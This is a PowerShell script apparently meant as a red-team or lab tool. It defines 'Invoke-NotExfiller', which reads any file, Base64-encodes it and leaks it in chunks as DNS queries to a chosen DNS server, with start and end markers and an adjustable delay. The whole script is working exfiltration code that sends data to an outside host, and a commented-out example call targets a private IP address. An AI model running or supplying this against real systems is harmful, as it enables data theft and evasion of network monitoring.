function Invoke-NotExfiller {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$true)][string]$DNSServer,
        [Parameter(Mandatory=$true)][string]$File,
        [Parameter(Mandatory=$false)][int]$RequestLength,
        [Parameter(Mandatory=$false)][int]$Delay
    )

    # Set default optional values if not set on command line
    if (!$RequestLength) { $RequestLength = 30 }
    if (!$Delay) { $Delay = 0 }

    $targetDomain = ".test.local"

    # Check the given file path is valid
    If (!(Test-Path $File)) 
    {
        Write-Output "[-] Error accessing file: '$File'!"
        Exit(-1)
    }

    # Get bytes from the target file and convert to Base64
    $fileContentBytes = [System.IO.File]::ReadAllBytes((Convert-Path $File))
    $fileContentB64 = [Convert]::ToBase64String($fileContentBytes)

    # Replace equals with dash to make it URL safe
    $fileContentB64 = $fileContentB64.replace('=', '-')
    $fileContentB64 = $fileContentB64.replace('/', '-0-')
    $fileContentB64 = $fileContentB64.replace('+', '-00-')

    $totalRequests = [Math]::Floor($fileContentB64.Length/$RequestLength)+2

    Write-Output "[*] Sending a total of $totalRequests DNS requests to $DNSServer"

    # Send start of file identifier
    $requestString = "11111" + $File.replace('.', '-').replace('\', '') + "11111" + $targetDomain
    Resolve-DnsName -Name ($requestString) -Server $DNSServer -DnsOnly -Type A -NoHostsFile

    # Set up counter to count total number of requests
    $counter = 0

    # Loop over Base64 data sending the specific number of characters per request
    for ($i=0; $i -lt $fileContentB64.Length; $i += $RequestLength) {
        try {
            $requestString = $fileContentB64.substring($i, $RequestLength) + $targetDomain
            Resolve-DnsName -Name ($requestString) -Server $DNSServer -DnsOnly -Type A -NoHostsFile
            $counter++
        }
        catch {
            $requestString = $fileContentB64.substring($i) + $targetDomain
            Resolve-DnsName -Name ($requestString) -Server $DNSServer -DnsOnly -Type A -NoHostsFile
            $counter++
        }

        Start-Sleep -Milliseconds $Delay
    }

    # Send end of file identifier
    $requestString = "000000000000000" + $targetDomain
    Resolve-DnsName -Name ($requestString) -Server $DNSServer -DnsOnly -Type A -NoHostsFile


    Write-Output "[+] Successfully sent file '$File' over a total of $totalRequests requests to $DNSServer"

    #### 
    # Below can be used for troubleshooting to ensure the data is converted correctly
    ####
    # $fileContentOriginal = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($fileContentB64))
    # Write-Output "Original: $fileContentOriginal"


}

#Invoke-NotExfiller -DNSServer 192.168.51.108 -File test.docx
